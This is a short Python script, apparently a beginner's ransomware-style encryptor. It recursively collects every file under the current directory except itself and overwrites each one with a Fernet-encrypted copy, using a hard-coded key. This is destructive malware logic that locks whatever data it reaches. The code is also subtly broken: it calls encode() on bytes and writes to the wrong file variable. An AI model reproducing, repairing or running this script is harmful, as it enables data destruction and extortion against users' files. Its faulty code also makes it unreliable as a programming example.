#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

# find targets
targets = []
for (root, dirs, files) in os.walk(os.getcwd(), topdown=True):
        for file in files:
                if file != "encrypt.py":
                        targets.append(root+'/'+file)

# key
key = b'Fzh0I3_PYxI2nZqLjLJEOMDoROxG-Op-AQRNymU110Y='

# encrypt targets
for target in targets:
        with open(target, "rb") as thetarget:
                contents = thetarget.read()
        contents_encrypted = Fernet(key).encrypt(contents.encode())
        with open(file, "wb") as thetarget:
                thetarget.write(contents_encrypted)
